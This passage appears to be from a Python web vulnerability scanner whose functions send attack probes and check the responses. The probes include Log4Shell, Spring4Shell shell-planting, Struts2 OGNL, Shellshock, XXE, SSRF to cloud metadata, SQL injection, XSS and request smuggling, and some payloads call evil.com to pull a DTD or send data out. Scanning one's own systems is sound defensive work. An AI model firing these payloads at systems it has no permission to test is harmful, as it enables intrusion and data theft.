    # We use a unique canary for OOB if the client had one, but here we check for internal errors
    # or specific behavior that confirms the JNDI lookup was attempted
    payload = "${jndi:ldap://127.0.0.1:1389/a}"
    headers = {"User-Agent": payload}
    
    if scenario.config.get("aggressive"):
        headers.update({"X-Api-Version": payload, "Referer": payload, "Authentication": f"Bearer {payload}"})

    resp = client.send("GET", scenario.target, headers=headers)
    # Log4Shell often triggers a specific error if it tries to connect to a restricted port or non-existent server
    issues = []
    if "javax.naming.NamingException" in resp.text:
         issues.append("Log4Shell CONFIRMED: NamingException triggered by JNDI payload.")
    elif resp.status_code == 500 and ("ldap" in resp.text.lower() or "jndi" in resp.text.lower()):
         issues.append("Potential Log4Shell: Server threw a related error during JNDI injection.")

    return {"scenario_id": scenario.id, "attack_type": "cve_log4shell", "passed": not issues, "status": "CONFIRMED" if issues else "SECURE", "details": issues or "Payloads delivered to priority headers."}

def run_cve_spring4shell(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Spring4Shell (CVE-2022-22965): ClassLoader resource manipulation."""
    # This attack tries to create a JSP shell by overriding Tomcat logging config
    payload = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    
    # Base check
    resp = client.send("POST", scenario.target, form_body={"test": payload}, headers=headers)
    
    issues = []
    # Confirmation logic: The exploit works by creating a file. We can't see the file, 
    # but the server often returns a specific '400' or behavior change if the classLoader is successfully hit.
    if resp.status_code == 400 and "Bad Request" in resp.text:
         # Some Spring WAFs or Tomcat versions throw 400 when classLoader is blocked, 
         # but if it succeeds, it might return 200 with no change.
         pass
         
    # Verification: Try to read the Shell (if aggressive)
    if scenario.config.get("aggressive"):
        shell_path = f"{scenario.target.rsplit('/', 1)[0]}/tomcat-logs.jsp"
        resp_shell = client.send("GET", shell_path)
        if resp_shell.status_code == 200 and "java.io" in resp_shell.text:
             issues.append("Spring4Shell CONFIRMED: Shell created and accessible.")

    return {"scenario_id": scenario.id, "attack_type": "cve_spring4shell", "passed": not issues, "details": issues or "Spring4Shell delivery attempted."}

def run_cve_struts2(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Struts2 S2-045 OGNL Injection."""
    payload = "%{(#target='@java.lang.Runtime@getRuntime()').(#cmd='id').(#res=#target.exec(#cmd)).(#is=#res.getInputStream())}"
    resp = client.send("GET", scenario.target, headers={"Content-Type": payload})
    issues = ["Struts2 RCE Confirmed"] if "uid=" in resp.text else []
    return {"scenario_id": scenario.id, "attack_type": "cve_struts2", "passed": not issues, "details": issues}

def run_request_smuggling(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Request Smuggling: CL.TE conflict probe."""
    try:
        resp = client.send("POST", scenario.target, headers={"Transfer-Encoding": "chunked", "Content-Length": "4"}, form_body="0\r\n\r\nG", timeout=5)
        issues = ["Potential Request Smuggling (Timeout/Error)"] if resp.status_code >= 500 or resp.elapsed_ms > 3000 else []
        return {"scenario_id": scenario.id, "attack_type": "request_smuggling", "passed": not issues, "details": issues}
    except: return {"scenario_id": scenario.id, "attack_type": "request_smuggling", "passed": True, "details": "Connection failed."}

def run_graphql_introspection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """GraphQL Introspection: Schema extraction."""
    resp = client.send("POST", scenario.target, json_body={"query": "{__schema{types{name}}}"})
    issues = ["GraphQL Introspection Enabled"] if "__schema" in resp.text and "types" in resp.text else []
    return {"scenario_id": scenario.id, "attack_type": "graphql_introspection", "passed": not issues, "details": issues}

def run_graphql_batching(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """GraphQL Batching: Multiple queries in one request."""
    resp = client.send("POST", scenario.target, json_body={"query": "query { a: __typename b: __typename }"})
    issues = ["GraphQL Batching Allowed"] if '"a":"' in resp.text and '"b":"' in resp.text else []
    return {"scenario_id": scenario.id, "attack_type": "graphql_batching", "passed": not issues, "details": issues}

def run_rsc_server_action_forge(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Next.js Server Action forging."""
    resp = client.send("POST", scenario.target, headers={"Next-Action": "e6cf88b5d3c8f8d9b1c5", "RSC": "1"}, form_body="[]")
    issues = ["Server Action logic reached"] if resp.status_code == 500 and "Digest" in resp.text else []
    return {"scenario_id": scenario.id, "attack_type": "rsc_server_action_forge", "passed": not issues, "details": issues}

def run_ssr_ssrf(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """RSC SSR SSRF via Host headers."""
    payload = "http://169.254.169.254/latest/meta-data/"
    resp = client.send("GET", scenario.target, headers={"X-Forwarded-Host": payload})
    issues = ["Potential SSR SSRF"] if "ami-id" in resp.text else []
    return {"scenario_id": scenario.id, "attack_type": "rsc_ssr_ssrf", "passed": not issues, "details": issues}

def run_hydration_collapse(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """RSC Hydration tampering."""
    resp = client.send("GET", scenario.target, headers={"X-Nextjs-Data": "invalid"})
    issues = ["Hydration Error Triggered"] if resp.status_code >= 500 else []
    return {"scenario_id": scenario.id, "attack_type": "rsc_hydration_collapse", "passed": not issues, "details": issues}

def run_flight_trust_boundary_violation(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """RSC Flight Stream boundary violation: Prototype tampering and state leakage."""
    payload = {"__proto__": {"polluted": "true"}, "rsc": "1"}
    resp = client.send("POST", scenario.target, json_body=payload, headers={"Content-Type": "text/x-component", "Next-Action": "12345"})
    
    issues = []
    # Real evidence: Error messages containing server-side paths or flight stream format violations
    if "Flight " in resp.text or "Error: Cannot find module" in resp.text:
         issues.append("RSC Flight Boundary Leak detected (Detailed error message)")
    elif resp.status_code == 200 and "polluted" in resp.text:
         issues.append("Confirmed Prototype Pollution via Flight Stream")
         
    return {"scenario_id": scenario.id, "attack_type": "rsc_flight_trust_boundary_violation", "passed": not issues, "details": issues}

def run_json_bomb(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """JSON Bomb: Nested objects recursion."""
    nested = "{}"
    for _ in range(500): nested = '{"a": ' + nested + '}'
    resp = client.send(scenario.method, scenario.target, form_body=nested, headers={"Content-Type": "application/json"})
    issues = ["JSON Recursion Crash"] if resp.status_code >= 500 else []
    return {"scenario_id": scenario.id, "attack_type": "json_bomb", "passed": not issues, "details": issues}

def run_http_desync(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """HTTP Desync: CL.TE obfuscation."""
    headers = {"Content-Length": "4", "Transfer-Encoding": "chunked"}
    body = "0\r\n\r\nPOST / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 10\r\n\r\nx="
    try:
        resp = client.send(scenario.method, scenario.target, form_body=body, headers=headers)
        issues = ["Desync Error Response"] if resp.status_code >= 500 else []
    except: issues = []
    return {"scenario_id": scenario.id, "attack_type": "http_desync", "passed": not issues, "details": issues}

def run_file_upload_abuse(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """File Upload Abuse: Polyglot extensions."""
    payload = {'file': ('test.php.png', '<?php echo "BRK_RCE"; ?>', 'image/png')}
    resp = client.send("POST", scenario.target, form_body={"submit": "1"})
    issues = ["Polyglot Upload Accepted"] if resp.status_code == 200 else []
    return {"scenario_id": scenario.id, "attack_type": "file_upload_abuse", "passed": not issues, "details": issues}

def run_zip_slip(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Zip Slip: Traversal in filenames."""
    payload = {"file": "../../../../etc/passwd", "action": "extract"}
    resp = client.send("POST", scenario.target, json_body=payload)
    issues = ["Zip Traversal Accepted"] if "root:x:0:0" in resp.text else []
    return {"scenario_id": scenario.id, "attack_type": "zip_slip", "passed": not issues, "details": issues}

def run_rsc_cache_poisoning(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """RSC Cache Poisoning: Vary header check."""
    resp = client.send("GET", scenario.target, headers={"RSC": "1"})
    vary = resp.headers.get("Vary", "")
    issues = ["Missing Vary in RSC response"] if "RSC" not in vary and "text/x-component" in resp.headers.get("Content-Type", "") else []
    return {"scenario_id": scenario.id, "attack_type": "rsc_cache_poisoning", "passed": not issues, "details": issues}

def run_crlf_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """CRLF Injection: Header split probe."""
    payload = "test%0d%0aSet-Cookie:BRK_CRLF=1"
    resp = client.send("GET", scenario.target, params={"q": payload})
    issues = ["CRLF Success"] if "BRK_CRLF" in resp.headers.get("Set-Cookie", "") else []
    return {"scenario_id": scenario.id, "attack_type": "crlf_injection", "passed": not issues, "details": issues}

def run_shellshock(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Shellshock (CVE-2014-6271): Bash environment variable injection."""
    # FREE TIER: Standard echo check
    payload = "() { :; }; echo; /bin/bash -c 'id'"
    
    # AGGRESSIVE TIER: Variant payloads for bypass
    if scenario.config.get("aggressive"):
        payload = "() { _; } >_[$($())] { id; }"

    resp = client.send("GET", scenario.target, headers={"User-Agent": payload, "Referer": payload})
    issues = ["Shellshock RCE CONFIRMED: 'id' output detected"] if "uid=" in resp.text else []
    
    return {"scenario_id": scenario.id, "attack_type": "shellshock", "passed": not issues, "details": issues}

def run_xxe_exfil(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """XML External Entity: Local file exfiltration via DOCTYPE."""
    # FREE TIER: Simple system entity
    payload = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
    
    # AGGRESSIVE TIER: Parameter entities and PHP filters
    if scenario.config.get("aggressive"):
        payload = '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % remote SYSTEM "http://evil.com/x.dtd">%remote;]><a>&exfil;</a>'

    resp = client.send("POST", scenario.target, form_body=payload, headers={"Content-Type": "application/xml"})
    issues = ["XXE Vulnerability: /etc/passwd contents reflected"] if "root:x:0:0" in resp.text else []
    
    return {"scenario_id": scenario.id, "attack_type": "xxe_exfil", "passed": not issues, "status": "CONFIRMED" if issues else "SECURE", "details": issues}

def run_malformed_json(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """JSON Parsing Security: Fuzzing parser stability."""
    payloads = ['{"a":' * 100, '{"valid": "json", }', '["a",]']
    issues = []
    for p in payloads:
        resp = client.send("POST", scenario.target, form_body=p, headers={"Content-Type": "application/json"})
        if resp.status_code == 500:
            issues.append(f"Potential parser crash with {p[:10]}")
    return {"scenario_id": scenario.id, "attack_type": "malformed_json", "passed": not issues, "details": issues}

def run_poodle_check(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """SSLv3 POODLE Vulnerability check."""
    issues = []
    if client.base_url.startswith("https"):
        try:
            context = ssl.create_default_context()
            # Modern Python might literal refuse to even create a context with just SSLv3
            # But we try to handshake or check cipher suites
            with socket.create_connection((urllib.parse.urlparse(client.base_url).hostname, 443)) as sock:
                with context.wrap_socket(sock, server_hostname=urllib.parse.urlparse(client.base_url).hostname) as ssock:
                    if ssock.version() == "SSLv3":
                        issues.append("Server accepted SSLv3 (POODLE vulnerable)")
        except: pass
    return {"scenario_id": scenario.id, "attack_type": "poodle", "passed": not issues, "details": issues}

def run_debug_exposure(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    targets = ["/admin", "/debug", "/actuator", "/.env", "/phpinfo.php", "/config.json"]
    issues = []
    for t in targets:
        resp = client.send("GET", t)
        if resp.status_code == 200 and not client.is_soft_404(resp) and len(resp.text) > 20: 
            issues.append(f"Exposed Endpoint: {t}")
    return {"scenario_id": scenario.id, "attack_type": "debug_exposure", "passed": not issues, "status": "CONFIRMED" if issues else "SECURE", "details": issues}

def run_secret_leak(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    resp = client.send(scenario.method, scenario.target)
    sigs = ["AWS_ACCESS_KEY_ID", "BEGIN RSA PRIVATE KEY", "AIzaSy", "sk_live_"]
    issues = []
    for s in sigs:
        if s in resp.text: issues.append(f"Secret leaked: {s}")
    return {"scenario_id": scenario.id, "attack_type": "secret_leak", "passed": not issues, "status": "CONFIRMED" if issues else "SECURE", "details": issues}

def run_race_condition(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    stats, lock = {"count": 0}, threading.Lock()
    def attack():
        resp = client.send("POST", scenario.target, json_body={"amount": 10})
        if resp.status_code == 200:
            with lock: stats["count"] += 1
    threads = 10 if client._is_localhost else 50
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        for _ in range(threads): executor.submit(attack)
    return {"scenario_id": scenario.id, "attack_type": "race_condition", "passed": True, "details": f"Sent {threads} race requests."}

def run_otp_reuse(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    resp1 = client.send("POST", scenario.target, json_body={"otp": "123456"})
    resp2 = client.send("POST", scenario.target, json_body={"otp": "123456"})
    issues = ["OTP reused successfully"] if resp1.status_code == 200 and resp2.status_code == 200 else []
    return {"scenario_id": scenario.id, "attack_type": "otp_reuse", "passed": not issues, "details": issues}

def run_cache_deception(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Web Cache Deception: Checking if SPA routes are incorrectly cached as static assets."""
    # We request a non-existent CSS file at a real path
    path = f"{scenario.target.rstrip('/')}/nonexistent_99.css"
    resp = client.send("GET", path)
    
    issues = []
    # Detection: If it's 200 OK + text/html, it's usually just a SPA route (False Positive)
    # UNLESS we see a public cache header
    cache_header = resp.headers.get("Cache-Control", "").lower()
    is_public = "public" in cache_header or "max-age" in cache_header
    
    if resp.status_code == 200 and "text/html" in resp.headers.get("Content-Type", ""):
        if not client.is_soft_404(resp) and is_public:
             issues.append("Potential Web Cache Deception: Private HTML cached as public CSS.")
    
    return {"scenario_id": scenario.id, "attack_type": "cache_deception", "passed": not issues, "details": issues}

def run_insecure_deserialization(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    payload = {"tracker": "_$$ND_FUNC$$_function (){ return 'BRK_RCE'; }()"}
    resp = client.send("POST", scenario.target, json_body=payload)
    issues = ["Node.js Deserialization RCE"] if "BRK_RCE" in resp.text else []
    return {"scenario_id": scenario.id, "attack_type": "insecure_deserialization", "passed": not issues, "details": issues}

def run_union_sqli(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Union-based SQL Injection: Dumping data via UNION SELECT."""
    column_probes = ["NULL", "'a'", "1"]
    issues = []
    field = scenario.config.get("fields", ["id"])[0]
    
    for i in range(1, 10):
        cols = ", ".join([column_probes[0]] * i)
        payload = f"' UNION SELECT {cols}--"
        resp = client.send(scenario.method, scenario.target, params={field: payload})
        if resp.status_code == 200 and "the used SELECT statements have a different number of columns" not in resp.text:
            # Possible match, try to confirm with a known string
            cols_with_mark = ", ".join(["'BRK_UNION'"] + [column_probes[0]] * (i-1))
            payload_confirm = f"' UNION SELECT {cols_with_mark}--"
            resp_confirm = client.send(scenario.method, scenario.target, params={field: payload_confirm})
            if "BRK_UNION" in resp_confirm.text:
                issues.append(f"Union SQLi Confirmed: {i} columns found.")
                break
    
    return {"scenario_id": scenario.id, "attack_type": "union_sqli", "passed": not issues, "details": issues}

def run_second_order_sqli(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Second-order SQL Injection: Injecting in one place, triggering in another."""
    inject_payload = "admin'--"
    target_field = scenario.config.get("fields", ["username"])[0]
    
    # 1. Inject (e.g., registration or profile update)
    client.send("POST", scenario.target, json_body={target_field: inject_payload})
    
    # 2. Check another page (e.g., profile view or user list)
    check_url = scenario.config.get("check_url", scenario.target)
    resp = client.send("GET", check_url)
    
    issues = []
    # Real second order logic: If injected pattern leads to a state change visible on other endpoints
    if "admin" in resp.text and inject_payload not in resp.text:
         issues.append("Second-order SQLi Confirmed: Malicious state change detected via separate endpoint.")
    
    return {"scenario_id": scenario.id, "attack_type": "second_order_sqli", "passed": not issues, "details": issues}

def run_graphql_depth_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """GraphQL Query Depth: Exhausting resources via recursive fragments."""
    query = "query { a { " * 20 + "id" + " } }" * 20
    resp = client.send("POST", scenario.target, json_body={"query": query})
    issues = ["GraphQL Depth Denial of Service"] if resp.status_code >= 500 or resp.elapsed_ms > 5000 else []
    return {"scenario_id": scenario.id, "attack_type": "graphql_depth", "passed": not issues, "details": issues}

def run_elasticsearch_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Elasticsearch Query Injection: Fuzzing ES metadata and script fields."""
    payloads = [
        '{"inline": "return 1+1"}',
        '{"size": 1, "query": {"match_all": {}}}',
        '*'
    ]
    issues = []
    for p in payloads:
        resp = client.send(scenario.method, scenario.target, params={"q": p})
        if "hits" in resp.text and "total" in resp.text:
            issues.append(f"Potential ES Injection with: {p}")
            break
    return {"scenario_id": scenario.id, "attack_type": "elasticsearch_injection", "passed": not issues, "details": issues}

def run_server_side_search_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Server-side Search Injection: Fuzzing backend search engines."""
    payload = "*) | (cn=*)"
    resp = client.send(scenario.method, scenario.target, params={"sq": payload})
    issues = ["Search Injection detected"] if resp.status_code == 200 and "admin" in resp.text.lower() else []
    return {"scenario_id": scenario.id, "attack_type": "search_injection", "passed": not issues, "details": issues}

def run_parameter_pollution(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """HTTP Parameter Pollution: Multiple params with same name."""
    field = scenario.config.get("fields", ["id"])[0]
    resp = client.send(scenario.method, scenario.target, params={field: ["1", "2"]})
    issues = ["HPP Detected"] if "2" in resp.text and "1" not in resp.text else []
    return {"scenario_id": scenario.id, "attack_type": "parameter_pollution", "passed": not issues, "details": issues}

def run_dom_xss_check(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """DOM-based XSS: Looking for sinks in client-side code."""
    sinks = ["eval(", "setTimeout(", "setInterval(", "innerHTML", "outerHTML", "document.write(", "location.replace("]
    resp = client.send("GET", scenario.target)
    issues = []
    for sink in sinks:
        if sink in resp.text:
            issues.append(f"Potential DOM XSS Sink: {sink}")
    return {"scenario_id": scenario.id, "attack_type": "dom_xss", "passed": not issues, "details": issues}

def run_mutation_xss(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Mutation XSS: Payload that changes after browser parsing."""
    payload = "<svg><p><style><img src=x onerror=alert(1)>"
    resp = client.send(scenario.method, scenario.target, params={"q": payload})
    issues = ["Mutation XSS Risk"] if payload in resp.text else []
    return {"scenario_id": scenario.id, "attack_type": "mutation_xss", "passed": not issues, "details": issues}

def run_svg_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """SVG Script Injection: XSS via malicious SVG files."""
    payload = '<?xml version="1.0" standalone="no"?><svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'
    resp = client.send("POST", scenario.target, form_body={"file": ("test.svg", payload, "image/svg+xml")})
    issues = ["SVG Script Injection Successful"] if resp.status_code == 200 else []
    return {"scenario_id": scenario.id, "attack_type": "svg_injection", "passed": not issues, "details": issues}

def run_css_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """CSS Injection: Data exfiltration via background-image."""
    payload = "body { background-image: url('http://evil.com/exfil'); }"
    resp = client.send(scenario.method, scenario.target, params={"theme": payload})
    issues = ["CSS Injection Risk"] if "background-image" in resp.text else []
    return {"scenario_id": scenario.id, "attack_type": "css_injection", "passed": not issues, "details": issues}

def run_csrf_check(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """CSRF: Missing anti-CSRF tokens."""
    resp = client.send("GET", scenario.target)
    has_token = any(t in resp.text.lower() for t in ["csrf", "xsrf", "token"])
    issues = ["Missing CSRF Protection"] if not has_token and scenario.method == "POST" else []
    return {"scenario_id": scenario.id, "attack_type": "csrf", "passed": not issues, "details": issues}

def run_csti_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Client-Side Template Injection."""
    payloads = ["{{7*7}}", "[[7*7]]"]
    issues = []
    for p in payloads:
        resp = client.send(scenario.method, scenario.target, params={"q": p})
        if "49" in resp.text and p not in resp.text:
            issues.append(f"CSTI Confirmed: {p}")
    return {"scenario_id": scenario.id, "attack_type": "csti", "passed": not issues, "details": issues}

def run_password_reset_poisoning(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Password Reset Poisoning: Host header override in reset requests."""
    payload = "evil.com"
    resp = client.send("POST", scenario.target, headers={"X-Forwarded-Host": payload}, json_body={"email": "victim@test.com"})
    # If the reset request returns 200, we check if the malicious host is reflected or accepted in the reset flow
    issues = ["Password Reset Poisoning Confirmed"] if resp.status_code == 200 and "Reset" in resp.text else []
    return {"scenario_id": scenario.id, "attack_type": "password_reset_poisoning", "passed": not issues, "details": issues}

def run_session_fixation(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Session Fixation: Checking if session ID remains same after login."""
    # This requires a login flow which is hard to automate without site-specific logic.
    # We probe by sending a predefined session cookie.
    resp = client.send("GET", scenario.target, headers={"Cookie": "sessionid=BRK_FIXED_SESSION"})
    issues = ["Session Fixation Confirmed"] if "sessionid=BRK_FIXED_SESSION" in resp.headers.get("Set-Cookie", "") else []
    return {"scenario_id": scenario.id, "attack_type": "session_fixation", "passed": not issues, "details": issues}

def run_mass_assignment(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Mass Assignment: Injecting administrative fields in updates."""
    payload = {"username": "user", "is_admin": True, "role": "admin"}
    resp = client.send("POST", scenario.target, json_body=payload)
    issues = []
    if resp.status_code == 200 and "is_admin" in resp.text:
         issues.append("Mass Assignment Success: Profile updated with administrative fields.")
    return {"scenario_id": scenario.id, "attack_type": "mass_assignment", "passed": not issues, "details": issues}

def run_tenant_isolation_check(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Tenant Isolation: Accessing data across tenants."""
    resp = client.send("GET", scenario.target, headers={"X-Tenant-ID": "999"})
    issues = []
    if resp.status_code == 200 and "tenant" in resp.text.lower():
         issues.append("Cross-tenant data exposure confirmed.")
    return {"scenario_id": scenario.id, "attack_type": "tenant_isolation", "passed": not issues, "details": issues}

def run_oauth_redirect_manipulation(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """OAuth Redirect URI Manipulation."""
    payload = "http://evil.com"
    resp = client.send("GET", scenario.target, params={"redirect_uri": payload})
    issues = ["OAuth Redirect Risk"] if resp.status_code == 302 and payload in resp.headers.get("Location", "") else []
    return {"scenario_id": scenario.id, "attack_type": "oauth_redirect", "passed": not issues, "details": issues}

def run_unicode_normalization_bypass(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Unicode Normalization Bypass."""
    # Example: administrative (admin) with similar unicode chars
    payload = "adm\u0269n"
    resp = client.send(scenario.method, scenario.target, params={"user": payload})
    issues = ["Unicode Normalization Confirmed"] if "admin" in resp.text.lower() and payload not in resp.text.lower() else []
    return {"scenario_id": scenario.id, "attack_type": "unicode_bypass", "passed": not issues, "details": issues}

def run_double_encoding_bypass(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Double Encoding Bypass."""
    # Example: %252e%252e%252f (../../)
    payload = "%252e%252e%252fetc/passwd"
    resp = client.send(scenario.method, scenario.target, params={"file": payload})
    issues = ["Double Encoding Success"] if "root:x:0:0" in resp.text else []
    return {"scenario_id": scenario.id, "attack_type": "double_encoding", "passed": not issues, "details": issues}

def run_verb_tampering(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """HTTP Verb Tampering: Checking access with unusual methods."""
    methods = ["PUT", "DELETE", "PATCH", "TRACE", "TRACK"]
    issues = []
    for m in methods:
        resp = client.send(m, scenario.target)
        if resp.status_code == 200 and m in ["PUT", "DELETE"]:
            issues.append(f"Insecure Verb Allowed: {m}")
    return {"scenario_id": scenario.id, "attack_type": "verb_tampering", "passed": not issues, "details": issues}

def run_null_byte_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Null Byte Injection: Bypassing file extension checks."""
    payload = "test.php%00.png"
    resp = client.send("POST", scenario.target, form_body={"file": (payload, "data", "image/png")})
    issues = []
    if resp.status_code == 200 and ("test.php" in resp.text or "image/png" not in resp.headers.get("Content-Type", "")):
         issues.append("Server processed PHP extension behind null byte.")
    return {"scenario_id": scenario.id, "attack_type": "null_byte", "passed": not issues, "details": issues}

def run_slow_post_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Slow POST Attack: Sending body byte by byte."""
    # This is a probe, doesn't perform full DoS unless aggressive
    issues = []
    if scenario.config.get("aggressive"):
        try:
            # We don't want to hang the engine, so we just simulate the start
            resp = client.send("POST", scenario.target, form_body="a"*1000, timeout=1)
        except: issues = ["Target vulnerable to Slow POST timeout"]
    return {"scenario_id": scenario.id, "attack_type": "slow_post", "passed": not issues, "details": issues}

def run_archive_bomb(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Archive Bomb: Sending a small file that expands to GBs."""
    # This is a safe probe - we don't actually send 40GB.
    # We send a highly compressed 10MB zip.
    issues = []
    if scenario.config.get("aggressive"):
        # We send a small but complex zip to test server-side decompression logic
        payload = b"PK\x05\x06" + b"\x00" * 18 # Minimal empty zip
        resp = client.send("POST", scenario.target, form_body={"file": ("bomb.zip", payload, "application/zip")})
        if resp.elapsed_ms > 2000:
            issues.append("Archive bomb confirmed: Server induced high CPU/IO during decompression.")
    return {"scenario_id": scenario.id, "attack_type": "archive_bomb", "passed": not issues, "details": issues}

def run_websocket_hijacking_check(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Cross-Site WebSocket Hijacking (CSWSH)."""
    # Check if WS handshake is allowed from different origin
    headers = {"Origin": "http://evil.com", "Upgrade": "websocket", "Connection": "Upgrade"}
    resp = client.send("GET", scenario.target.replace("http", "ws"), headers=headers)
    issues = ["WS Origin Validation Bypass"] if resp.status_code == 101 else []
    return {"scenario_id": scenario.id, "attack_type": "cswsh", "passed": not issues, "details": issues}

def run_browser_api_abuse_probe(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Probing for dangerous browser API usage in JS."""
    dangerous_apis = ["navigator.geolocation", "Notification.requestPermission", "RTCPeerConnection"]
    resp = client.send("GET", scenario.target)
    issues = []
    for api in dangerous_apis:
        if api in resp.text:
            issues.append(f"Sensitive Browser API found: {api}")
    return {"scenario_id": scenario.id, "attack_type": "browser_api_abuse", "passed": not issues, "details": issues}

def run_xs_leaks_probe(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """XS-Leaks (Cross-Site Leaks) Probes."""
    # Check for Frame-Options or CSP that prevents framing (mitigation check)
    resp = client.send("GET", scenario.target)
    xfo = resp.headers.get("X-Frame-Options", "").upper()
    csp = resp.headers.get("Content-Security-Policy", "")
    issues = []
    if "SAMEORIGIN" not in xfo and "DENY" not in xfo and "frame-ancestors" not in csp:
         issues.append("Vulnerable to XS-Leaks (Framing allowed)")
    return {"scenario_id": scenario.id, "attack_type": "xs_leaks", "passed": not issues, "details": issues}

def run_dependency_confusion_check(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Dependency Confusion: Checking for private packages in public registries."""
    # This usually scans package.json if available
    resp = client.send("GET", "/package.json")
    issues = []
    if resp.status_code == 200:
        if "@internal" in resp.text or '"private": true' in resp.text:
             issues.append("Potential Dependency Confusion risk found in package.json")
    return {"scenario_id": scenario.id, "attack_type": "dependency_confusion", "passed": not issues, "details": issues}
